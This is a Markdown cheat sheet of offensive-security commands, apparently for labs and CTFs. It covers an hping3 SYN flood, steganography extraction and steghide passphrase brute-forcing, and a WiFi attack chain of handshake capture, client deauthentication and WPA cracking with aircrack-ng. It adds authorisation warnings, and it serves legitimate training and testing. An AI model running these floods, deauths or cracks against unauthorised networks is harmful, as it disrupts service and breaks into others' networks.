# DoS, Steganography & WiFi Hacking

## DoS (lab/authorized testing only)

### Basic SYN flood test with hping3

```
sudo hping3 -S -p <port> --flood <target-ip>
```

**Use when:** Testing resilience of a system you're explicitly authorized to load-test.

**Note:** Never run against anything you don't own or have written authorization for.

---

## Steganography

### Check a file's metadata/type

```
exiftool <file>
file <file>
```

**Use when:** First step on any stego challenge — confirm what you're actually looking at.

---

### Extract hidden data with steghide

```
steghide extract -sf <image.jpg>
```

**Use when:** A JPG/BMP/WAV is suspected to hold steghide-embedded data.

**Note:** Will prompt for a passphrase — try blank first, then wordlist with `stegcracker`.

---

### Brute-force a steghide passphrase

```
stegcracker <image.jpg> <wordlist.txt>
```

**Use when:** `steghide extract` needs a passphrase you don't have.

---

### Inspect PNG for hidden chunks/data

```
zsteg <image.png>
```

**Use when:** Working a PNG-based stego challenge (common in CTFs).

---

### Check for appended data after EOF

```
binwalk <file>
binwalk -e <file>
```

**Use when:** Suspecting a file has another file (zip, image, etc.) embedded/appended inside it.

---

## WiFi Hacking

### Put interface into monitor mode

```
sudo airmon-ng start <interface>
```

**Use when:** Starting any WiFi assessment — required before capturing raw 802.11 traffic.

---

### Scan for nearby networks

```
sudo airodump-ng <interface>mon
```

**Use when:** Identifying target SSID, BSSID, and channel before an attack.

---

### Capture a WPA handshake

```
sudo airodump-ng -c <channel> --bssid <bssid> -w capture <interface>mon
```

**Use when:** Targeting a specific AP to capture the 4-way handshake for offline cracking.

---

### Deauth a client to force a handshake

```
sudo aireplay-ng --deauth 10 -a <bssid> -c <client-mac> <interface>mon
```

**Use when:** No handshake captured yet — forces a client to reauthenticate.

**Note:** Only against networks you own or are explicitly authorized to test.

---

### Crack a captured handshake

```
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

**Use when:** You have a `.cap` file with a handshake and want to recover the WPA passphrase.
